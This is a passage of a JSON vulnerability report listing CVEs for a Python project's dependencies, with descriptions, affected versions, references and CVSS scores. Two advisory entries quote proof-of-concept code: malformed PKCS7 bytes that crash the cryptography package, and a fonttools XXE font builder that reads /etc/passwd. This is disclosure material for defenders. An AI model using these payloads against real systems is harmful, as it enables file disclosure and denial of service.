Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TY5SI6NK5243DEEDQUFKQKW5GQNKQUMA"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WSYWMP64ZFCTC3VO6RY6EC6VSSMV6I3A"},{"summary":"Cve 2023","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-49082"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-49082"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"NETWORK","availabilityImpact":"NONE","baseScore":5.3,"baseSeverity":"MEDIUM","confidentialityImpact":"NONE","environmentalScore":5.3,"environmentalSeverity":"MEDIUM","integrityImpact":"LOW","modifiedAttackComplexity":"LOW","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"NONE","modifiedConfidentialityImpact":"NONE","modifiedIntegrityImpact":"LOW","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":5.3,"temporalSeverity":"MEDIUM","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N","version":"3.1"},"products":["aiohttp@vers:pypi/>=0.1|<=3.9.0rc0"]}],"title":"CVE-2023-49082/pkg:pypi/aiohttp@3.8.5"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-21503"]}],"cve":"CVE-2024-21503","cwe":{"id":"1333","name":"Inefficient Regular Expression Complexity"},"discovery_date":"2024-03-19T06:30:52","ids":[{"system_name":"CVE Record","text":"CVE-2024-21503"},{"system_name":"GitHub Advisory","text":"PYSEC-2024-48"},{"system_name":"Snyk Advisory","text":"SNYK-PYTHON-BLACK-6256273"}],"notes":[{"audience":"developers","category":"other","text":"Failure to Sanitize Special Elements into a Different Plane","title":"Additional CWE: 75"},{"category":"description","details":"Vulnerability Description","text":"Black vulnerable to Regular Expression Denial of Service (ReDoS)"},{"category":"details","details":"Vulnerability Details","text":"# Black vulnerable to Regular Expression Denial of Service (ReDoS) Versions of the package black before 24.3.0 are vulnerable to Regular Expression Denial of Service (ReDoS) via the lines_with_leading_tabs_expanded function in the strings.py file. An attacker could exploit this vulnerability by crafting a malicious input that causes a denial of service.  Exploiting this vulnerability is possible when running Black on untrusted input, or if you habitually put thousands of leading tab characters in your docstrings.  ## Related CVE(s) CVE-2024-21503, PYSEC-2024-48"}],"product_status":{"known_affected":["black@vers:pypi/>=18.3a0|<=24.2.0"],"known_not_affected":["black@24.3.0"]},"references":[{"summary":"GitHub Advisory PYSEC-2024-48","url":"https://github.com/pypa/advisory-database/tree/main/vulns/black/PYSEC-2024-48.yaml"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-21503"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-21503"},{"summary":"Snyk Advisory SNYK-PYTHON-BLACK-6256273","url":"https://security.snyk.io/vuln/SNYK-PYTHON-BLACK-6256273"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"NETWORK","availabilityImpact":"LOW","baseScore":5.3,"baseSeverity":"MEDIUM","confidentialityImpact":"NONE","environmentalScore":5.3,"environmentalSeverity":"MEDIUM","integrityImpact":"NONE","modifiedAttackComplexity":"LOW","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"LOW","modifiedConfidentialityImpact":"NONE","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":5.3,"temporalSeverity":"MEDIUM","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L","version":"3.1"},"products":["black@vers:pypi/>=18.3a0|<=24.2.0"]}],"title":"CVE-2024-21503/pkg:pypi/black@22.12.0"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-39689"]}],"cve":"CVE-2024-39689","cwe":{"id":"345","name":"Insufficient Verification of Data Authenticity"},"discovery_date":"2024-07-05T20:06:40","ids":[{"system_name":"CVE Record","text":"CVE-2024-39689"},{"system_name":"GitHub Advisory","text":"GHSA-248v-346w-9cwc"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"Certifi removes GLOBALTRUST root certificate"},{"category":"details","details":"Vulnerability Details","text":"# Certifi removes GLOBALTRUST root certificate Certifi 2024.07.04 removes root certificates from \"GLOBALTRUST\" from the root store. These are in the process of being removed from Mozilla's trust store.  GLOBALTRUST's root certificates are being removed pursuant to an investigation which identified \"long-running and unresolved compliance issues\". Conclusions of Mozilla's investigation can be found [here]( https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/XpknYMPO8dI)."}],"product_status":{"known_affected":["certifi@vers:pypi/>=2021.05.30|<2024.07.04"],"known_not_affected":["certifi@2024.07.04"]},"references":[{"summary":"GitHub Advisory GHSA-248v-346w-9cwc","url":"https://github.com/certifi/python-certifi/security/advisories/GHSA-248v-346w-9cwc"},{"summary":"Google Mailing List","url":"https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/XpknYMPO8dI"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-39689"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-39689"}],"scores":[{"cvss_v3":{"attackComplexity":"HIGH","attackVector":"NETWORK","availabilityImpact":"NONE","baseScore":3.1,"baseSeverity":"LOW","confidentialityImpact":"LOW","environmentalScore":3.1,"environmentalSeverity":"LOW","integrityImpact":"NONE","modifiedAttackComplexity":"HIGH","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"NONE","modifiedConfidentialityImpact":"LOW","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"REQUIRED","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":3.1,"temporalSeverity":"LOW","userInteraction":"REQUIRED","vectorString":"CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","version":"3.1"},"products":["certifi@vers:pypi/>=2021.05.30|<2024.07.04"]}],"title":"CVE-2024-39689/pkg:pypi/certifi@2023.7.22"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2023-50782"]}],"cve":"CVE-2023-50782","cwe":{"id":"203","name":"Observable Discrepancy"},"discovery_date":"2024-02-05T21:30:31","ids":[{"system_name":"CVE Record","text":"CVE-2023-50782"},{"system_name":"Red Hat Bugzilla","text":"redhat-bugzilla-2254432"}],"notes":[{"audience":"developers","category":"other","text":"Observable Timing Discrepancy","title":"Additional CWE: 208"},{"category":"description","details":"Vulnerability Description","text":"Python Cryptography package vulnerable to Bleichenbacher timing oracle attack"},{"category":"details","details":"Vulnerability Details","text":"# Python Cryptography package vulnerable to Bleichenbacher timing oracle attack A flaw was found in the python-cryptography package. This issue may allow a remote attacker to decrypt captured messages in TLS servers that use RSA key exchanges, which may lead to exposure of confidential or sensitive data."}],"product_status":{"known_affected":["cryptography@vers:pypi/>=0.1|<=41.0.7"]},"references":[{"summary":"CVE Record","url":"https://access.redhat.com/security/cve/CVE-2023-50782"},{"summary":"Red Hat Bugzilla","url":"https://bugzilla.redhat.com/show_bug.cgi?id=2254432"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-50782"},{"summary":"Cve 2023","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-50782"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"NETWORK","availabilityImpact":"NONE","baseScore":7.5,"baseSeverity":"HIGH","confidentialityImpact":"HIGH","environmentalScore":7.5,"environmentalSeverity":"HIGH","integrityImpact":"NONE","modifiedAttackComplexity":"LOW","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"NONE","modifiedConfidentialityImpact":"HIGH","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":7.5,"temporalSeverity":"HIGH","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N","version":"3.1"},"products":["cryptography@vers:pypi/>=0.1|<=41.0.7"]}],"title":"CVE-2023-50782/pkg:pypi/cryptography@41.0.4"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-26130"]}],"cve":"CVE-2024-26130","cwe":{"id":"476","name":"NULL Pointer Dereference"},"discovery_date":"2024-02-21T18:04:40","ids":[{"system_name":"CVE Record","text":"CVE-2024-26130"},{"system_name":"GitHub Advisory","text":"GHSA-6vqw-3v5j-54x4"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"cryptography NULL pointer dereference with pkcs12.serialize_key_and_certificates when called with a non-matching certificate and private key and an hmac_hash override"},{"category":"details","details":"Vulnerability Details","text":"# cryptography NULL pointer dereference with pkcs12.serialize_key_and_certificates when called with a non-matching certificate and private key and an hmac_hash override If `pkcs12.serialize_key_and_certificates` is called with both:  1. A certificate whose public key did not match the provided private key 2. An `encryption_algorithm` with `hmac_hash` set (via `PrivateFormat.PKCS12.encryption_builder().hmac_hash(...)`  Then a NULL pointer dereference would occur, crashing the Python process.  This has been resolved, and now a `ValueError` is properly raised.  Patched in https://github.com/pyca/cryptography/pull/10423"}],"product_status":{"known_affected":["cryptography@vers:pypi/>=38.0.0|<42.0.4"],"known_not_affected":["cryptography@42.0.4"]},"references":[{"summary":"GitHub Advisory GHSA-6vqw-3v5j-54x4","url":"https://github.com/pyca/cryptography/security/advisories/GHSA-6vqw-3v5j-54x4"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-26130"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-26130"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"NETWORK","availabilityImpact":"HIGH","baseScore":7.5,"baseSeverity":"HIGH","confidentialityImpact":"NONE","environmentalScore":7.5,"environmentalSeverity":"HIGH","integrityImpact":"NONE","modifiedAttackComplexity":"LOW","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"HIGH","modifiedConfidentialityImpact":"NONE","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":7.5,"temporalSeverity":"HIGH","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H","version":"3.1"},"products":["cryptography@vers:pypi/>=38.0.0|<42.0.4"]}],"title":"CVE-2024-26130/pkg:pypi/cryptography@41.0.4"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-0727"]}],"cve":"CVE-2024-0727","discovery_date":"2024-01-26T09:30:23","ids":[{"system_name":"Openssl Advisory","text":"03b3941d60c4bce58fab69a0c22377ab439bc0e8"},{"system_name":"Openssl Advisory","text":"20240125"},{"system_name":"GitHub Advisory","text":"3472"},{"system_name":"CVE Record","text":"CVE-2024-0727"},{"system_name":"Openssl Advisory","text":"aebaa5883e31122b404e450732dc833dc9dee539"},{"system_name":"NetApp Advisory","text":"ntap-20240208-0006"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"Null pointer dereference in PKCS12 parsing"},{"category":"details","details":"Vulnerability Details","text":"# Null pointer dereference in PKCS12 parsing Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL to crash leading to a potential Denial of Service attack  Impact summary: Applications loading files in the PKCS12 format from untrusted sources might terminate abruptly.  A file in PKCS12 format can contain certificates and keys and may come from an untrusted source. The PKCS12 specification allows certain fields to be NULL, but OpenSSL does not correctly check for this case. This can lead to a NULL pointer dereference that results in OpenSSL crashing. If an application processes PKCS12 files from an untrusted source using the OpenSSL APIs then that application will be vulnerable to this issue.  OpenSSL APIs that are vulnerable to this are: PKCS12_parse(), PKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes() and PKCS12_newpass().  We have also fixed a similar issue in SMIME_write_PKCS7(). However since this function is related to writing data we do not consider it security significant.  The FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue."}],"product_status":{"known_affected":["cryptography@vers:pypi/>=0.1|<=42.0.1"]},"references":[{"summary":"Openwall Mailing List","url":"http://www.openwall.com/lists/oss-security/2024/03/11/1"},{"summary":"GitHub Advisory 3472","url":"https://github.com/github/advisory-database/pull/3472"},{"summary":"Openssl Advisory 03b3941d60c4bce58fab69a0c22377ab439bc0e8","url":"https://github.openssl.org/openssl/extended-releases/commit/03b3941d60c4bce58fab69a0c22377ab439bc0e8"},{"summary":"Openssl Advisory aebaa5883e31122b404e450732dc833dc9dee539","url":"https://github.openssl.org/openssl/extended-releases/commit/aebaa5883e31122b404e450732dc833dc9dee539"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-0727"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-0727"},{"summary":"NetApp Advisory ntap-20240208-0006","url":"https://security.netapp.com/advisory/ntap-20240208-0006"},{"summary":"Openssl Advisory 20240125","url":"https://www.openssl.org/news/secadv/20240125.txt"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"LOCAL","availabilityImpact":"HIGH","baseScore":5.5,"baseSeverity":"MEDIUM","confidentialityImpact":"NONE","environmentalScore":5.5,"environmentalSeverity":"MEDIUM","integrityImpact":"NONE","modifiedAttackComplexity":"LOW","modifiedAttackVector":"LOCAL","modifiedAvailabilityImpact":"HIGH","modifiedConfidentialityImpact":"NONE","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"REQUIRED","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":5.5,"temporalSeverity":"MEDIUM","userInteraction":"REQUIRED","vectorString":"CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H","version":"3.1"},"products":["cryptography@vers:pypi/>=0.1|<=42.0.1"]}],"title":"CVE-2024-0727/pkg:pypi/cryptography@41.0.4"},{"acknowledgements":[{"organization":"GitHub","urls":["https://github.com/pyca/cryptography/security/advisories/GHSA-h4gh-qq45-vh27"]}],"cwe":{"id":"1395","name":"Dependency on Vulnerable Third-Party Component"},"discovery_date":"2024-09-03T21:59:48","ids":[{"system_name":"Openssl-library Advisory","text":"20240903"},{"system_name":"GitHub Advisory","text":"GHSA-h4gh-qq45-vh27"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"pyca/cryptography has a vulnerable OpenSSL included in cryptography wheels"},{"category":"details","details":"Vulnerability Details","text":"# pyca/cryptography has a vulnerable OpenSSL included in cryptography wheels pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 37.0.0-43.0.0 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://openssl-library.org/news/secadv/20240903.txt.  If you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions."}],"product_status":{"known_affected":["cryptography@vers:pypi/>=37.0.0|<43.0.1"],"known_not_affected":["cryptography@43.0.1"]},"references":[{"summary":"GitHub Advisory GHSA-h4gh-qq45-vh27","url":"https://github.com/pyca/cryptography/security/advisories/GHSA-h4gh-qq45-vh27"},{"summary":"Openssl-library Advisory 20240903","url":"https://openssl-library.org/news/secadv/20240903.txt"}],"scores":[{"cvss_v3":{"attackComplexity":"HIGH","attackVector":"NETWORK","availabilityImpact":"LOW","baseScore":5.0,"baseSeverity":"MEDIUM","confidentialityImpact":"LOW","environmentalScore":5.0,"environmentalSeverity":"MEDIUM","integrityImpact":"LOW","modifiedAttackComplexity":"HIGH","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"LOW","modifiedConfidentialityImpact":"LOW","modifiedIntegrityImpact":"LOW","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"REQUIRED","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":5.0,"temporalSeverity":"MEDIUM","userInteraction":"REQUIRED","vectorString":"CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L","version":"3.1"},"products":["cryptography@vers:pypi/>=37.0.0|<43.0.1"]}],"title":"GHSA-h4gh-qq45-vh27/pkg:pypi/cryptography@41.0.4"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2023-49083"]}],"cve":"CVE-2023-49083","cwe":{"id":"476","name":"NULL Pointer Dereference"},"discovery_date":"2023-11-28T20:46:46","ids":[{"system_name":"CVE Record","text":"CVE-2023-49083"},{"system_name":"GitHub Advisory","text":"GHSA-jfhm-5ghh-2f97"},{"system_name":"GitHub Advisory","text":"PYSEC-2023-254"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"cryptography vulnerable to NULL-dereference when loading PKCS7 certificates"},{"category":"details","details":"Vulnerability Details","text":"# cryptography vulnerable to NULL-dereference when loading PKCS7 certificates ### Summary  Calling `load_pem_pkcs7_certificates` or `load_der_pkcs7_certificates` could lead to a NULL-pointer dereference and segfault.  ### PoC Here is a Python code that triggers the issue: ```python from cryptography.hazmat.primitives.serialization.pkcs7 import load_der_pkcs7_certificates, load_pem_pkcs7_certificates  pem_p7 = b\"\"\" -----BEGIN PKCS7----- MAsGCSqGSIb3DQEHAg== -----END PKCS7----- \"\"\"  der_p7 = b\"\\x30\\x0B\\x06\\x09\\x2A\\x86\\x48\\x86\\xF7\\x0D\\x01\\x07\\x02\"  load_pem_pkcs7_certificates(pem_p7) load_der_pkcs7_certificates(der_p7) ```  ### Impact Exploitation of this vulnerability poses a serious risk of Denial of Service (DoS) for any application attempting to deserialize a PKCS7 blob/certificate. The consequences extend to potential disruptions in system availability and stability.  ## Related CVE(s) CVE-2023-49083, PYSEC-2023-254"}],"product_status":{"known_affected":["cryptography@vers:pypi/>=3.1|<41.0.6"],"known_not_affected":["cryptography@41.0.6"]},"references":[{"summary":"Openwall Mailing List","url":"http://www.openwall.com/lists/oss-security/2023/11/29/2"},{"summary":"GitHub Advisory GHSA-jfhm-5ghh-2f97","url":"https://github.com/pyca/cryptography/security/advisories/GHSA-jfhm-5ghh-2f97"},{"summary":"GitHub Advisory PYSEC-2023-254","url":"https://github.com/pypa/advisory-database/tree/main/vulns/cryptography/PYSEC-2023-254.yaml"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QMNTYMUGFJSDBYBU22FUYBHFRZODRKXV"},{"summary":"Cve 2023","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-49083"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-49083"}],"scores":[{"cvss_v3":{"attackComplexity":"HIGH","attackVector":"NETWORK","availabilityImpact":"HIGH","baseScore":5.9,"baseSeverity":"MEDIUM","confidentialityImpact":"NONE","environmentalScore":5.9,"environmentalSeverity":"MEDIUM","integrityImpact":"NONE","modifiedAttackComplexity":"HIGH","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"HIGH","modifiedConfidentialityImpact":"NONE","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":5.9,"temporalSeverity":"MEDIUM","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H","version":"3.1"},"products":["cryptography@vers:pypi/>=3.1|<41.0.6"]}],"title":"CVE-2023-49083/pkg:pypi/cryptography@41.0.4"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2023-29483"]}],"cve":"CVE-2023-29483","cwe":{"id":"696","name":"Incorrect Behavior Order"},"discovery_date":"2024-04-11T15:30:48","ids":[{"system_name":"CVE Record","text":"CVE-2023-29483"},{"system_name":"Snyk Advisory","text":"SNYK-PYTHON-DNSPYTHON-6241713"},{"system_name":"NetApp Advisory","text":"ntap-20240510-0001"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"Potential DoS via the Tudoor mechanism in eventlet and dnspython"},{"category":"details","details":"Vulnerability Details","text":"# Potential DoS via the Tudoor mechanism in eventlet and dnspython eventlet before 0.35.2, as used in dnspython before 2.6.0, allows remote attackers to interfere with DNS name resolution by quickly sending an invalid packet from the expected IP address and source port, aka a \"TuDoor\" attack. In other words, dnspython does not have the preferred behavior in which the DNS name resolution algorithm would proceed, within the full time window, in order to wait for a valid packet. NOTE: dnspython 2.6.0 is unusable for a different reason that was addressed in 2.6.1."}],"product_status":{"known_affected":["dnspython@vers:pypi/>=1.0.0|<=2.6.0rc1"]},"references":[{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/NLRKR57IFVKQC2GCXZBFLCLBAWBWL3F6"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/VOHJOO3OM65UIUUUVDEXMCTXNM6LXZEH"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/X3BNSIK5NFYSAP53Y45GOCMOQHHDLGIF"},{"summary":"Cve 2023","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-29483"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-29483"},{"summary":"NetApp Advisory ntap-20240510-0001","url":"https://security.netapp.com/advisory/ntap-20240510-0001"},{"summary":"Snyk Advisory SNYK-PYTHON-DNSPYTHON-6241713","url":"https://security.snyk.io/vuln/SNYK-PYTHON-DNSPYTHON-6241713"}],"scores":[{"cvss_v3":{"attackComplexity":"HIGH","attackVector":"NETWORK","availabilityImpact":"HIGH","baseScore":5.9,"baseSeverity":"MEDIUM","confidentialityImpact":"NONE","environmentalScore":5.9,"environmentalSeverity":"MEDIUM","integrityImpact":"NONE","modifiedAttackComplexity":"HIGH","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"HIGH","modifiedConfidentialityImpact":"NONE","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":5.9,"temporalSeverity":"MEDIUM","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H","version":"3.1"},"products":["dnspython@vers:pypi/>=1.0.0|<=2.6.0rc1"]}],"title":"CVE-2023-29483/pkg:pypi/dnspython@2.3.0"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2023-45139"]}],"cve":"CVE-2023-45139","cwe":{"id":"611","name":"Improper Restriction of XML External Entity Reference"},"discovery_date":"2024-01-09T16:01:10","ids":[{"system_name":"CVE Record","text":"CVE-2023-45139"},{"system_name":"GitHub Advisory","text":"GHSA-6673-4983-2vx5"}],"notes":[{"category":"description","details":"Vulnerability Description","text":"fonttools XML External Entity Injection (XXE) Vulnerability"},{"category":"details","details":"Vulnerability Details","text":"# fonttools XML External Entity Injection (XXE) Vulnerability ### Summary  As of `fonttools>=4.28.2` the subsetting module has a XML External Entity Injection (XXE) vulnerability which allows an attacker to resolve arbitrary entities when a candidate font (OT-SVG fonts), which contains a SVG table, is parsed.   This allows attackers to include arbitrary files from the filesystem fontTools is running on or make web requests from the host system.   ### PoC   The vulnerability can be reproduced following the bellow steps on a unix based system.  1. Build a OT-SVG font which includes a external entity in the SVG table which resolves a local file. In our testing we utilised `/etc/passwd` for our POC file to include and modified an existing subset integration test to build the POC font - see bellow.  ```python  from string import ascii_letters from fontTools.fontBuilder import FontBuilder from fontTools.pens.ttGlyphPen import TTGlyphPen from fontTools.ttLib import newTable   XXE_SVG = \"\"\"\\ <?xml version=\"1.0\"?> <!DOCTYPE svg [<!ENTITY test SYSTEM 'file:///etc/passwd'>]> <svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">  <g id=\"glyph1\">   <text font-size=\"10\" x=\"0\" y=\"10\">&test;</text>  </g> </svg> \"\"\"  def main():   # generate a random TTF font with an SVG table   glyph_order = [\".notdef\"] + list(ascii_letters)   pen = TTGlyphPen(glyphSet=None)   pen.moveTo((0, 0))   pen.lineTo((0, 500))   pen.lineTo((500, 500))   pen.lineTo((500, 0))   pen.closePath()   glyph = pen.glyph()   glyphs = {g: glyph for g in glyph_order}    fb = FontBuilder(unitsPerEm=1024, isTTF=True)   fb.setupGlyphOrder(glyph_order)   fb.setupCharacterMap({ord(c): c for c in ascii_letters})   fb.setupGlyf(glyphs)   fb.setupHorizontalMetrics({g: (500, 0) for g in glyph_order})   fb.setupHorizontalHeader()   fb.setupOS2()   fb.setupPost()   fb.setupNameTable({\"familyName\": \"TestSVG\", \"styleName\": \"Regular\"})    svg_table = newTable(\"SVG \")   svg_table.docList = [     (XXE_SVG, 1, 12)   ]   fb.font[\"SVG \"] = svg_table    fb.font.save('poc-payload.ttf')  if __name__ == '__main__':   main()  ```  2. Subset the font with an affected version of fontTools - we tested on `fonttools==4.42.1` and `fonttools==4.28.2` - using the following flags (which just ensure the malicious glyph is mapped by the font and not discard in the subsetting process):  ```shell pyftsubset poc-payload.ttf --output-file=\"poc-payload.subset.ttf\" --unicodes=\"*\" --ignore-missing-glyphs ```  3. Read the parsed SVG table in the subsetted font:  ```shell ttx -t SVG poc-payload.subset.ttf && cat poc-payload.subset.ttx ```  Observed the included contents of the `/etc/passwd` file.   ### Impact  Note the final severity is dependant on the environment fontTools is running in.  - The vulnerability has the most impact on consumers of fontTools who leverage the subsetting utility to subset untrusted OT-SVG fonts where the vulnerability may be exploited to read arbitrary files from the filesystem of the host fonttools is running on    ### Possible Mitigations   There may be other ways to mitigate the issue, but some suggestions:  1. Set the `resolve_entities=False` flag on parsing methods 2. Consider further methods of disallowing doctype declarations 3. Consider recursive regex matching"}],"product_status":{"known_affected":["fonttools@vers:pypi/>=4.28.2|<4.43.0"],"known_not_affected":["fonttools@4.43.0"]},"references":[{"summary":"Openwall Mailing List","url":"http://www.openwall.com/lists/oss-security/2024/03/08/2"},{"summary":"Openwall Mailing List","url":"http://www.openwall.com/lists/oss-security/2024/03/09/1"},{"summary":"GitHub Advisory GHSA-6673-4983-2vx5","url":"https://github.com/fonttools/fonttools/security/advisories/GHSA-6673-4983-2vx5"},{"summary":"Fedora Project Mailing List Announcement","url":"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VY63B4SGY4QOQGUXMECRGD6K3YT3GJ75"},{"summary":"Cve 2023","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-45139"},{"summary":"CVE Record","url":"https://nvd.nist.gov/vuln/detail/CVE-2023-45139"}],"scores":[{"cvss_v3":{"attackComplexity":"LOW","attackVector":"NETWORK","availabilityImpact":"NONE","baseScore":7.5,"baseSeverity":"HIGH","confidentialityImpact":"HIGH","environmentalScore":7.5,"environmentalSeverity":"HIGH","integrityImpact":"NONE","modifiedAttackComplexity":"LOW","modifiedAttackVector":"NETWORK","modifiedAvailabilityImpact":"NONE","modifiedConfidentialityImpact":"HIGH","modifiedIntegrityImpact":"NONE","modifiedPrivilegesRequired":"NONE","modifiedScope":"UNCHANGED","modifiedUserInteraction":"NONE","privilegesRequired":"NONE","scope":"UNCHANGED","temporalScore":7.5,"temporalSeverity":"HIGH","userInteraction":"NONE","vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N","version":"3.1"},"products":["fonttools@vers:pypi/>=4.28.2|<4.43.0"]}],"title":"CVE-2023-45139/pkg:pypi/fonttools@4.40.0"},{"acknowledgements":[{"organization":"NVD","urls":["https://nvd.nist.gov/vuln/detail/CVE-2024-22190"]}],"cve":"CVE-2024-22190","cwe":{"id":"426","name":"Untrusted Search Path"},"discovery_date":"2024-01-10T15:46:00","ids":[{"system_name":"CVE Record","text":"CVE-2024-22190"},{"system_name":"GitHub Advisory","text":"GHSA-2mqj-m65w-jghx"},{"system_name":"GitHub Advisory","text":"PYSEC-2024-4"}],"notes":[{"category":"description","details":"Vulnerability Description"},{"category":"details","details":"Vulnerability Details","text":"Refer to the supporting media"}],"product_status":{"known_affected":["gitpython@vers:pypi/>=0.0.0|<3.1.41"],"known_not_affected":["gitpython@3.1.41"]},"references":[{"summary":"GitHub Advisory GHSA-2mqj-m65w-jghx","url":"https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-2mqj-m65w-jghx"},{"summary":"GitHub Advisory PYSEC-2024-4","url":"https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2024-4.yaml"},{"summary":"Cve 2024","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-22190"},{"summary":"CVE 